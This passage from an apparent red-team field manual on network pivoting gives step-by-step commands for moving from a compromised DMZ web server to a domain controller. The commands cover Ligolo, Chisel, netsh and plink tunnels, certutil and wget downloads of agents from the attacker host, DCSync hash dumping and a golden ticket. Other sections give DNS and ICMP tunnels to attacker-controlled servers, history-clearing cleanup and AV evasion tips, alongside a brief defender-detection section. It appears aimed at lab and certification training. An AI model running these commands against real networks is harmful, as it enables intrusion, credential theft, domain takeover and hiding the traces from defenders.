# FULL SCENARIO: Compromise web server in DMZ, pivot to AD
# ══════════════════════════════════════════════════════════════════
#
# TOPOLOGY:
# ┌────────────────────────────────────────────────────────────────┐
# │ Kali          Web01 (DMZ)       Internal          DC01 (AD)   │
# │ 10.10.10.50 → 10.10.10.100   → 192.168.1.0/24  → 10.0.1.0/24│
# │               also:192.168.1.200  WS01:192.168.1.50           │
# │                                                  DC01:10.0.1.10│
# └────────────────────────────────────────────────────────────────┘
#
# Initial access: RCE on Web01 via web app vulnerability
# Goal: Compromise DC01

# ── PHASE 1: INITIAL SHELL ON WEB01 ───────────────────────────────
# Web app RCE → reverse shell on Web01:
# (See Web App module — file upload / command injection)
# nc -lvnp 4444 on Kali
# Shell arrives: www-data@web01:/var/www/html$

# Stabilize shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# ── PHASE 2: ENUMERATE WEB01's NETWORK POSITION ────────────────────
ip a
# eth0: 10.10.10.100/24 (DMZ)
# eth1: 192.168.1.200/24 (Internal LAN!)  ← Pivot opportunity!

ip route
# default via 10.10.10.1 dev eth0
# 192.168.1.0/24 dev eth1  ← Web01 has direct route to internal!

cat /etc/hosts
# 10.0.1.10  dc01.corp.local  dc01  ← DC is in a third network!

# ── PHASE 3: SET UP LIGOLO PIVOT VIA WEB01 ─────────────────────────
# Upload ligolo agent to Web01:
# Kali: python3 -m http.server 8080
wget http://10.10.10.50:8080/agent -O /tmp/agent && chmod +x /tmp/agent

# Start Ligolo proxy on Kali:
./proxy -selfcert -laddr 0.0.0.0:11601

# Run agent on Web01:
/tmp/agent -connect 10.10.10.50:11601 -ignore-cert &

# In Ligolo console:
# session → select web01 → start

# Add route to Internal LAN:
sudo ip route add 192.168.1.0/24 dev ligolo

# ── PHASE 4: ENUMERATE INTERNAL FROM KALI ─────────────────────────
# Now Kali can reach 192.168.1.0/24 directly!
nmap -sV -p 22,80,443,445,3389,5985 192.168.1.0/24 --open
# Expected findings:
# 192.168.1.50  WS01  - 445/tcp open, 3389/tcp open, 5985/tcp open
# 192.168.1.10  IT01  - 22/tcp open, 80/tcp open

# Kerberoast from Kali via ligolo (internal network fully accessible):
bloodhound-python -u bob -p Password1! \
  -ns 192.168.1.10 -d corp.local -c All --zip

# ── PHASE 5: COMPROMISE WS01 (INTERNAL) ───────────────────────────
# Use found credentials:
evil-winrm -i 192.168.1.50 -u bob -p Password1!
# Shell on WS01!

# Upload second ligolo agent to WS01:
*Evil-WinRM* PS> upload /kali/agent.exe C:\Windows\Temp\agent.exe

# Start second proxy on Kali (different port):
./proxy -selfcert -laddr 0.0.0.0:11602

# Add listener on Web01 (as relay for WS01 to reach Kali):
# In ligolo console (Web01 session):
# listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602

# Run agent on WS01:
*Evil-WinRM* PS> C:\Windows\Temp\agent.exe -connect 192.168.1.200:11602 -ignore-cert

# ── PHASE 6: ROUTE TO AD NETWORK ──────────────────────────────────
# New agent connected. In Ligolo console, select WS01 session:
# start (WS01 agent)

# Create second tun interface:
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up

# Add route to AD network:
sudo ip route add 10.0.1.0/24 dev ligolo2

# ── PHASE 7: ATTACK DC01 FROM KALI ────────────────────────────────
# Full AD network accessible!
nmap -sV -p 88,389,445,636,3268 10.0.1.10
# Expected: DC01 ports open!

# DCSync attack:
impacket-secretsdump CORP/carol:Password1!@10.0.1.10
# ALL domain hashes dumped!

# Golden ticket:
# (Use KRBTGT hash from DCSync)
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local Administrator
export KRB5CCNAME=/tmp/Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local

# SYSTEM on DC01! Through three network hops!
```

---

## 35. Windows-Only Pivot Scenario

```powershell
# SCENARIO: All pivots are Windows, no SSH available
# Tools: netsh, plink, Chisel for Windows, Ligolo Windows agent

# TOPOLOGY: Kali → WS01 (Windows) → SQL01 (Windows, internal)

# ── METHOD 1: NETSH PORT FORWARD ─────────────────────────────────
# On WS01 (via evil-winrm or meterpreter shell):
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=11433 connectaddress=10.0.1.50 connectport=1433
netsh advfirewall firewall add rule name="FWD_SQL" protocol=TCP dir=in localport=11433 action=allow
# From Kali: impacket-mssqlclient -port 11433 sa@10.10.10.100

# ── METHOD 2: CHISEL WINDOWS AGENT ────────────────────────────────
# On Kali:
./proxy -selfcert --reverse -p 8080

# On WS01 (download and execute):
certutil.exe -urlcache -split -f http://10.10.10.50:8080/chisel.exe C:\Windows\Temp\chisel.exe
C:\Windows\Temp\chisel.exe client 10.10.10.50:8080 R:socks
# SOCKS on Kali:1080 → through WS01 → SQL01

# ── METHOD 3: LIGOLO WINDOWS AGENT ────────────────────────────────
# Most powerful option for Windows pivots:
C:\Windows\Temp\agent.exe -connect 10.10.10.50:11601 -ignore-cert
# After session starts in Ligolo console:
sudo ip route add 10.0.1.0/24 dev ligolo
# Direct access to internal Windows network — no proxychains!

# ── METHOD 4: PLINK SSH TUNNEL ────────────────────────────────────
# If Kali has SSH server running (sudo service ssh start):
C:\Windows\Temp\plink.exe -R 9001:10.0.1.50:3389 -batch -pw "Password1!" kali@10.10.10.50
# WS01 creates reverse tunnel to Kali
# xfreerdp /v:localhost:9001 → SQL01 RDP!
```

---

## 36. Heavily Restricted Egress Scenario

```bash
# SCENARIO: Only DNS and ICMP allowed outbound from pivot
# No HTTP, no HTTPS, no TCP to arbitrary ports
# Extreme environment: air-gapped network with DNS stub resolver

# ── DNS TUNNEL ─────────────────────────────────────────────────────
# Setup (you control tunnel.attacker.com):
# VPS DNS: ns1.attacker.com points to YOUR_VPS
# Domain: tunnel.attacker.com NS ns1.attacker.com

# On your VPS:
ruby dnscat2-server.rb tunnel.attacker.com --no-cache

# On target (pivot — has DNS access):
./dnscat --dns domain=tunnel.attacker.com,server=8.8.8.8
# 8.8.8.8 → resolves tunnel.attacker.com → YOUR VPS → dnscat2
# Even if 8.8.8.8 is blocked, internal DNS forwarder works:
./dnscat --dns domain=tunnel.attacker.com,server=INTERNAL_DNS_IP

# In dnscat2 — create TCP tunnel through DNS:
dnscat2> session -i 1
# command> listen --addr 0.0.0.0 127.0.0.1:1337 192.168.1.50:22
# Port forward: YOUR_VPS:1337 → DNS → pivot → 192.168.1.50:22
ssh -p 1337 user@YOUR_VPS_IP
# SSH to internal machine through DNS tunnel!

# ── ICMP TUNNEL (if DNS is also blocked) ──────────────────────────
# Last resort — if only ICMP (ping) is allowed:
# On VPS:
sudo ptunnel-ng
# On target:
sudo ptunnel-ng -p YOUR_VPS_IP -lp 8022 -da 127.0.0.1 -dp 22
# SSH through ping packets:
ssh -p 8022 user@127.0.0.1

# IMPORTANT NOTE:
# DNS/ICMP tunnels are SLOW (10-50 Kbps typically)
# Good for: shell access, small file transfers, pivoting setup
# Bad for: large file transfers, video, high-bandwidth tools
```

---

# PART 10 — OPSEC & DETECTION

---

## 37. What Pivoting Leaves Behind

```
ARTIFACTS PER TECHNIQUE:

SSH TUNNELING:
  → /var/log/auth.log on pivot: SSH connection from your IP
  → ~/.bash_history on pivot: ssh commands used
  → Connection state: visible in ss -tnp on pivot
  → Network connections visible to anyone with shell on pivot
  MITIGATION:
    - Route SSH through another hop (your IP is hidden)
    - Clear bash history on pivot after use
    - Use SSH multiplexing (single connection for all tunnels)
    - Kill tunnel when not in use (no persistent connection)

CHISEL:
  → Process list: chisel process visible on pivot
  → Network connection: outbound to your C2 IP visible
  → HTTP server logs if Chisel goes through nginx: request logs
  → Windows: SVCHOST32.EXE or chisel.exe in tasklist
  MITIGATION:
    - Rename binary: cp chisel.exe svchost32.exe
    - Kill after pivoting session ends
    - Use HTTPS mode (encrypted, harder to inspect)

LIGOLO-NG:
  → Process: agent process visible
  → Network: TUN connection to your C2
  → Kali: ligolo interface visible in ip a (to local operator only)
  MITIGATION:
    - Rename agent binary
    - Run as background process with nohup
    - Remove agent file after starting

NETSH PORT PROXY:
  → Registry: stored in HKLM\SYSTEM\CurrentControlSet\Services\PortProxy
  → Firewall rule: visible in netsh advfirewall show
  → PERSISTENT: survives reboots (a problem if system is audited later)
  MITIGATION:
    - ALWAYS clean up: netsh interface portproxy delete...
    - Remove firewall rule after use

SOCAT:
  → Process list: socat processes visible
  → Network: listening ports visible in ss/netstat
  MITIGATION:
    - Kill socat after session ends
    - Use -d -d flags only during debugging (noisy logging)

DNS TUNNELING:
  → DNS logs: unusual queries to external domain
  → HIGH DETECTION RISK: Security teams monitor DNS for anomalies
  → Long subdomains (base64 encoded data) = obvious pattern
  MITIGATION:
    - Only use when no other option
    - Limit bandwidth (slow tunnel = less suspicious)
    - Use legitimate-looking domain name

CLEANUP CHECKLIST (run before leaving):
  On Linux pivot:
    pkill agent chisel socat    # Kill tunnel processes
    rm /tmp/agent /tmp/chisel   # Remove binaries
    history -c && cat /dev/null > ~/.bash_history  # Clear history
    ip route del 192.168.1.0/24 dev ligolo  # Remove routes (Kali side)
    
  On Windows pivot:
    taskkill /IM agent.exe /F   # Kill processes
    del C:\Windows\Temp\agent.exe  # Remove files
    netsh interface portproxy reset  # Clear ALL port forwards
    netsh advfirewall firewall delete rule name="FWD"  # Remove FW rules
```

---

## 38. Pivoting Detection from Defender's View

```
HOW DEFENDERS DETECT PIVOTING:

1. SSH TUNNELING DETECTION:
   Alert: SSH connection with high data volume but low character count
   (Tunnel traffic has different patterns than interactive SSH)
   Detection: SIEM rule on auth.log — connections with forwarding options
   Zeek log: conn.log shows long-duration SSH connections with high bytes
   
2. PORT FORWARDING DETECTION:
   Alert: Unexpected listening ports on machines
   Detection: Baseline expected ports, alert on new listeners
   Tools: nmap scans of internal hosts, host-based agents (osquery)
   
3. UNUSUAL DNS PATTERNS:
   Alert: High entropy subdomain names (base64 data looks random)
   Alert: Unusually long DNS queries (>50 chars in label)
   Alert: High volume DNS to single domain
   Tool: Zeek dns.log analysis, commercial DNS security products
   
4. NETWORK ANOMALIES:
   Alert: Unexpected connections between network segments
   Detection: NetFlow analysis, East-West traffic monitoring
   Tool: Cisco Stealthwatch, Darktrace, AWS VPC Flow Logs
   
5. PROCESS/BINARY DETECTION:
   Alert: chisel.exe, agent.exe, plink.exe running
   Detection: AV signatures, EDR behavioral analysis
   AV evasion: Rename binaries, use process hollowing, reflective loading
   
6. BEHAVIORAL DETECTION (hardest to evade):
   Alert: Machine that normally does X is now doing Y
   "Web server is initiating SMB connections to internal hosts" → anomalous
   "Database server is connecting to domain controller" → anomalous
   Baseline normal behavior → alert on deviations
   Tools: Darktrace, Vectra, Microsoft Defender for Endpoint behavioral rules
   
EVASION STRATEGIES:
  - Blend with legitimate traffic patterns
  - Use allowed protocols and ports
  - Mimic normal user/system behavior timing (business hours)
  - Clean up artifacts immediately after each step
  - Minimize time active connections are maintained
  - Single-use infrastructure (new C2 domain/IP for each engagement)
```

---

*Next module: **Malware Development & AV/EDR Evasion** — shellcode, payload encoding, process injection, AMSI bypass, ETW bypass, custom C2, LOLBins, and building tools that survive modern endpoint protection.*

*Cross-references:*
- *SSH fundamentals: `Ports_Protocols_RedTeam_Field_Manual.md` Section 5*
- *DNS tunneling mechanism: `Ports_Protocols_RedTeam_Field_Manual.md` Section 8*
- *Using pivots for AD attacks: `Active_Directory_RedTeam_Field_Manual.md` all lateral movement sections*
- *Linux post-exploitation pivot setup: `Linux_PrivEsc_PostExploitation_RedTeam_Field_Manual.md` Sections 29-30*
- *Windows pivot tools: `Windows_PrivEsc_RedTeam_Field_Manual.md` (netsh)*

*Tools: ssh, autossh, chisel, ligolo-ng, proxychains4, socat, plink, rpivot,*
*dnscat2, iodine, ptunnel-ng, netsh, reGeorg, gost, Metasploit portfwd*

*Labs: HTB Pro Lab: Offshore (best multi-pivot lab), CRTO (heavily pivot-focused),*
*OSCP (every machine requires pivoting knowledge), PG Practice multi-machine paths,*
*TryHackMe: Wreath network (excellent free 3-machine pivot lab)*